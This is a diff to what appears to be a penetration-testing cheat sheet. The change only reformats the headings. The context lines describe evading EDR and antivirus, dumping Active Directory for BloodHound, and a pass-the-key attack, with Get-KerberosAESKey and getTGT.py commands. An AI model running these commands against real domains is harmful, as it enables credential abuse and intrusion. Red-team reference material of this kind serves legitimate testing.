@@ -390,10 +390,11 @@ target = self.getMachineName()
 
 To bypass protection systems such as NGFW, MSATA, EDR, AV:
 
-Bloodhound AD dumping:
+**Bloodhound AD dumping:**
+
 You can use an Active Directory dump through [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer). After generating a .dat dump file, you can parse it using [ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py) and upload it to the Bloodhound database.
 
-Pass the key attack:
+**Pass the key attack:**
 ```
 Get-KerberosAESKey -Password somepassword -Salt JAKI.LOCALsomeuser
 getTGT.py jaki.local/someuser@scrm.local -aesKey 'yourkey'
